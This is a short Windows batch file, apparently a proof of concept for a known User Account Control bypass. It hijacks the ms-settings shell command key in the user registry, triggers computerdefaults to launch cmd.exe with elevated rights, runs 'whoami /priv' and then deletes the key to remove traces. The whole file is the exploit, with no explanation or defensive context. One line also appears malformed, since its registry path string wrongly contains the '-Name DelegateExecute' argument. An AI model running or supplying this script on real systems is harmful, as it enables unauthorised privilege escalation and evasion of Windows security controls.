@echo off
Powershell New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Value 'C:\Windows\System32\cmd.exe /k whoami /priv' -Force;
Powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute" -PropertyType String -Force;
Powershell Start-Process "computerdefaults"
Powershell Remove-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Recurse -Force;
exit